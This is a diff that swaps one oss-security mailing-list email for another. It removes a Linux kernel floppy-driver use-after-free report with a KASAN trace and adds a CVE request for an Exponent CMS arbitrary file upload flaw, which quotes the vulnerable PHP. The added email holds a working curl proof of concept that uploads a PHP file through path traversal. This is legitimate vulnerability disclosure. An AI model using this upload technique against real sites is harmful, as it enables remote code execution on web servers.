@@ -1,4 +1,9 @@
-Received: (qmail 6142 invoked by uid 550); 10 May 2022 09:30:36 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2979" "Wednesday" "21" "September" "2016" "08:10:39" "+0800" "Carl Peng" "felixk3y@gmail.com" "<CAEiFw0UvtbGuJ-M_zR0M+BtrEMn_tg7J3KZs+huS25imOSTNkg@mail.gmail.com>" "78" "[oss-security] =?UTF-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4zLjkgQXJiaXRyYXJ5IEZpbGUgVXBsbw==?==?UTF-8?B?YWQgdnVsbmVyYWJpbGl0eSBpbiBleHBGaWxlLnBocA==?=" nil nil nil "9" "2016092100:10:39" "[oss-security] =?UTF-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4zLjkgQXJiaXRyYXJ5IEZpbGUgVXBsbw==?==?UTF-8?B?YWQgdnVsbmVyYWJpbGl0eSBpbiBleHBGaWxlLnBocA==?=" (number mark "U       felixk3y@gma Sep 21   78/2979  " thread-indent "\"[oss-security] =?UTF-8?B?Q1ZFIHJlcXVlc3TvvJpFeHBvbmVudCBDTVMgMi4zLjkgQXJiaXRyYXJ5IEZpbGUgVXBsbw==?==?UTF-8?B?YWQgdnVsbmVyYWJpbGl0eSBpbiBleHBGaWxlLnBocA==?=\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 25962 invoked by uid 550); 21 Sep 2016 00:46:31 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,119 +12,114 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 9867 invoked from network); 10 May 2022 07:00:03 -0000
+Received: (qmail 1948 invoked from network); 21 Sep 2016 00:10:51 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20210112;
+        d=gmail.com; s=20120113;
         h=mime-version:from:date:message-id:subject:to;
-        bh=f/iTEo48OohH9HRsScGVrPbkr3mS9KQjbP1H1ua64tc=;
-        b=LQQPA5VGZ+j1bXepzzMJaOPxoE4lSAGCIPKBvf1cLvtP6M6gj2nLURhaZbI3JHzz8R
-         IpvTEE03qrws2Trxd/iLhbZMwGyy7KZ3JClAu3HxRvp00fLptUMtpcTs90BYN111sAkd
-         TMt2mjIxQTod59F7BnT7JS3jVw92B1sVKsljb1BgMqxtyJo2ic1ZqOsfYAJ54FolhidJ
-         zapCkjBPAOOI2pE/V0zaROOCzC7E6MeqjV8nwcy31KKtK7E0WpfZ6sLb76UpazoTe98y
-         nbb8nyFA3khyAjHgCDAJiRhOmqPHs3RreKRxFjn1QDaUY6p8jAwuz1n8V7fN5xa8e3qy
-         JSwA==
+        bh=Q5jWkHfmPDX3COZuWBb42ph2qVW6qLjwtsPdj8jjbQo=;
+        b=kE9NPevkjUGIkT12Olvmy+HSjyYxqJu3Gt+drJVoMfpGDIuPeZ3/2W7tqzdTnpZy34
+         d3TN+PQZCePHkKLWk8Su+vG/cWVfw95glJrIkVpgipWc5a3oVmL8kPRaVXTmXE2YTFgB
+         ANmRDmJSXmVSs3mRXSwswyNkowB298eYzhg0nwkijViG18dTEVZL66/JF54RZwUQNqTH
+         A9lPizdBEtq9I6Do9RvNwt/jfBG3BBMnQ512DpQZ5ReuIlTX/uXhoHuc4J/liEMxumpl
+         bpGcHdXY1mi8BeMwmlFzFkyIOc5EagqnBg8kG9p8YT72A59aMJMdN/+2lOqAvlM1tDBT
+         tLSg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
+        d=1e100.net; s=20130820;
         h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=f/iTEo48OohH9HRsScGVrPbkr3mS9KQjbP1H1ua64tc=;
-        b=dz4qhv4pSi4Sgo1KUkwz6BLLEVUMn0huy8RsdqntnVjDx+ssI73/mriraWtFPhV3LA
-         aExqTERE1D0j/LP04fK22LfhK2vQ2bT6rn9awW5TWVuRVdEA0Wf6aMJkMnXE/Qa6IWJn
-         xaIgishmL4GVADmywYWYfgau8aheSrjCXY6KiXaZoLL8s+So0eB3lkJVqFC0Gj+YuQLe
-         U0kJV7ccXSWkSrOqwH8KSQgIMAB8XYSF9sQwEZULC4JOYjl8zd2pFNkgKEVh3d9H23It
-         gpalxOPp/hTXz1X42YZh+RKbYaAJ/Hqb8DW9T/iWZCxlPJ7rBZeoovgLnJWa2mJNb5nD
-         B+YQ==
-X-Gm-Message-State: AOAM531JGPnWBfSr4ffmTCj9eKKV9r9x90a36hemr2RhPUnJVJ1teoKc
-	blNkHpnzjS81OmJahUH0suzii7DMjsmQq0+HIrTwQqWn6gXauhzX
-X-Google-Smtp-Source: ABdhPJxQc/nHtGBNcZdeIkkbSkPiMs2M85tyqw5QX5r/vInBi19DJZp0/eyCghQatHdWnb9Pgc3pUyiuk83ClUGlreQ=
-X-Received: by 2002:a25:c54b:0:b0:649:dfa4:283c with SMTP id
- v72-20020a25c54b000000b00649dfa4283cmr16133073ybe.434.1652165991431; Mon, 09
- May 2022 23:59:51 -0700 (PDT)
+        bh=Q5jWkHfmPDX3COZuWBb42ph2qVW6qLjwtsPdj8jjbQo=;
+        b=BCjzJy9aRuZckjSDSq0CEdBFe1kdyHNcL++oWRwCjDhbnkYZQ7O76fUj2ZSkgEfLzW
+         7STYHK8siGBtCW+3pKB3sP/8r7pgaeicf8jz+pRXZaGFwM4zmPE2ChtqmOiArMX4XJaw
+         /pNK7mMiv4Hs1ZF1Zfg/h8W8gOoOYiQkpQJFsbMy2544mbLwWvjNIm+ookKSRCrUDKwB
+         k3/mIA8Xt6I6fvcChkpOu7QFhVKuFolIxgflF2LByrbsLTwJ7gsoa13H60YY0Hw+rc1Q
+         tKD6VWpizDXXlmEScRIiB8e6IOkHmDxLtBpe6+lVHXI6EcffsEB/stiW/Ggw1Ociw2I6
+         fMQQ==
+X-Gm-Message-State: AE9vXwMnnanT8FQQO6Vu+qolKdhFRA0jP7mAjGWuh54paFsQjKWkqrfDPJXGDjKOTOWsOw2xaMmW0fvlj9LZlw==
+X-Received: by 10.194.96.136 with SMTP id ds8mr29938704wjb.3.1474416640340;
+ Tue, 20 Sep 2016 17:10:40 -0700 (PDT)
 MIME-Version: 1.0
-From: Minh Yuan <yuanmingbuaa@gmail.com>
-Date: Tue, 10 May 2022 14:59:15 +0800
-Message-ID: <CAH5WSp5rKR6gaKDAG58nKAiOf4fkzTz-faSFCrX4mo7RNoigFQ@mail.gmail.com>
+From: Carl Peng <felixk3y@gmail.com>
+Date: Wed, 21 Sep 2016 08:10:39 +0800
+Message-ID: <CAEiFw0UvtbGuJ-M_zR0M+BtrEMn_tg7J3KZs+huS25imOSTNkg@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="00000000000007860c05dea2df09"
-Subject: [oss-security] Linux kernel: A concurrency use-after-free in bad_flp_intr for latest kernel version
+Content-Type: multipart/alternative; boundary=089e0103efb2193871053cf960e5
+Subject: [oss-security] =?UTF-8?Q?CVE_request=EF=BC=9AExponent_CMS_2=2E3=2E9_Arbitrary_File_Uplo?=
+	=?UTF-8?Q?ad_vulnerability_in_expFile=2Ephp?=
 
---00000000000007860c05dea2df09
-Content-Type: text/plain; charset="UTF-8"
+--089e0103efb2193871053cf960e5
+Content-Type: text/plain; charset=UTF-8
 
-Hi everyone,
+Hi, I reported the following Arbitrary File Upload vulnerability to the
+ExponentCMS team on Sep 13, 2016:
+vulnerability:
+https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/file/controllers/fileController.php#L570-L592
+```
+if (!empty($this->params['folder']) || (defined('QUICK_UPLOAD_FOLDER') &&
+QUICK_UPLOAD_FOLDER != '' && QUICK_UPLOAD_FOLDER != 0)) {
+            // prevent attempt to place file somewhere other than /files
+folder
+            if (!empty($this->params['folder']) &&
+strpos($this->params['folder'], '..') !== false) {
+                $ar = new expAjaxReply(300, gt("File was not uploaded!"));
+                $ar->send();
+            }
+            if (SITE_FILE_MANAGER == 'picker') {
+                $quikFolder = !empty($this->params['folder']) ?
+$this->params['folder'] :QUICK_UPLOAD_FOLDER;
+                $destDir = null;
+            } elseif (SITE_FILE_MANAGER == 'elfinder') {
+                $quikFolder = null;
+                $destDir = UPLOAD_DIRECTORY_RELATIVE .
+(!empty($this->params['folder']) ? $this->params['folder']
+:QUICK_UPLOAD_FOLDER) . '/';
+                // create folder if non-existant
+                expFile::makeDirectory($destDir);
+            }
+        } else {
+            $quikFolder = null;
+            $destDir = null;
+        }
+        //extensive suitability check before doing anything with the file...
+        if (isset($_SERVER['HTTP_X_FILE_NAME'])) {  //HTML5 XHR upload
+            $file =
+expFile::fileXHRUpload($_SERVER['HTTP_X_FILE_NAME'],false,false,null,$destDir,intval(QUICK_UPLOAD_WIDTH));
+ //here File Upload vulnerability
+            $file->poster = $user->id;
+```
+the "folder"  and "$_SERVER['HTTP_X_FILE_NAME']", the two parameters may be
+submitted by the user
 
-My fuzzer discovered another concurrency uaf between reset_interrupt and
-floppy_end_request in the latest kernel version (5.17.5 for now).
+expFile::fileXHRUpload():
+https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/file/models/expFile.php#L526
+```
+$_destFile = ($_destFile == null) ? self::fixName($fileName) : $_destFile;
+//"fileName" parameter may be submitted by the user
+//...
+$maxwidth = intval($_max_width);
+if (!empty($maxwidth)) {
+..///
+} else {
+    file_put_contents($_destFullPath, file_get_contents('php://input',
+'r')); // line 572
+}
 
-The root cause is that after deallocating current_req in floppy_end_request,
-reset_interrupt still holds the freed current_req->error_count and accesses
-it concurrently.
+Proof of concept:
+curl -H "X-File-Name: e.php" -d
+"controller=file&action=quickUpload&code=<?php
+phpinfo();?>&folder=../install" http://www.exponentcms.org/index.php
 
-Here is the KASAN report:
-
-BUG: KASAN: use-after-free in bad_flp_intr+0x332/0x460
-
-Call Trace:
- __dump_stack
- dump_stack+0x1e9/0x30e
- print_address_description+0x6a/0x310
- kasan_report_error
- kasan_report+0x1bf/0x290
- bad_flp_intr+0x332/0x460
- reset_interrupt+0x16e/0x1b0
- process_one_work+0xc61/0x1530
- worker_thread+0xa7f/0x1440
- kthread+0x346/0x370
- ret_from_fork+0x24/0x30
-
-Allocated by task 12590:
- kmem_cache_alloc_node+0x200/0x390
- alloc_request_simple+0x42/0x70
- mempool_alloc+0x166/0x6b0
- __get_request+0x92c/0x1c50
- get_request+0x756/0x10e0
- blk_queue_bio+0x523/0x12d0
-audit: type=1804 audit(1651287706.088:1517): pid=13750 uid=0 auid=0 ses=6
-subj==unconfined op=invalid_pcr cause=ToMToU comm="syz-executor.2"
-name=2F73797A6B616C6C65722D746573746469723539363038303737352F73797A6B616C6C65722E6C56656931332F313737362F48C7C060
-dev="sda" ino=136083 res=1
- generic_make_request+0x561/0xe20
- submit_bio+0x259/0x560
-audit: type=1800 audit(1651287706.088:1518): pid=13752 uid=0 auid=0 ses=6
-subj==unconfined op=collect_data cause=failed(directio)
-comm="syz-executor.2" name=48C7C060 dev="sda" ino=136083 res=0
- __floppy_read_block_0
- floppy_revalidate+0xa70/0xd90
- check_disk_change+0x11e/0x1a0
- floppy_open+0x54d/0x890
- __blkdev_get+0x3ce/0x1ab0
- blkdev_get+0x986/0xb20
- do_dentry_open+0x91d/0x10a0
- do_last
- path_openat+0x298d/0x6de0
- do_filp_open+0x24a/0x4c0
- do_sys_open+0x361/0x5d0
- do_syscall_64+0x111/0x710
- entry_SYSCALL_64_after_hwframe+0x49/0xbe
-
-Freed by task 2856:
- __cache_free
- kmem_cache_free+0xc8/0x260
- blk_free_request
- __blk_put_request+0x4d8/0xcd0
- __blk_end_bidi_request+0x1d4/0x260
- floppy_end_request
- request_done+0x701/0x950
- floppy_shutdown+0x14a/0x2b0
- process_one_work+0xc61/0x1530
- worker_thread+0xa7f/0x1440
- kthread+0x346/0x370
- ret_from_fork+0x24/0x30
+http://www.exponentcms.org/install/e.php
 
 
+And Now, This  vulnerability have been fixed.
+https://exponentcms.lighthouseapp.com/projects/61783/changesets/355702a9835cf527796c9d469a82258b7639148a
+https://github.com/exponentcms/exponent-cms/commit/355702a9835cf527796c9d469a82258b7639148a
 
-Timeline:
-* 04.30.22 - Vulnerability reported to security@kernel.org.
-* 05.01.22 - Vulnerability reported to linux-distros@vs.openwall.org.
-* 05.10.22 - Vulnerability opened.
+This issue was reported by Peng Hua of silence.com.cn Inc. and I would like
+to request a CVE for this issue (if not done so).
 
---00000000000007860c05dea2df09--
+Thank you.
+---------------------------------http://www.silence.com.cn
+penghua#silence.com.cn
+PKAV Team
+
+--089e0103efb2193871053cf960e5--
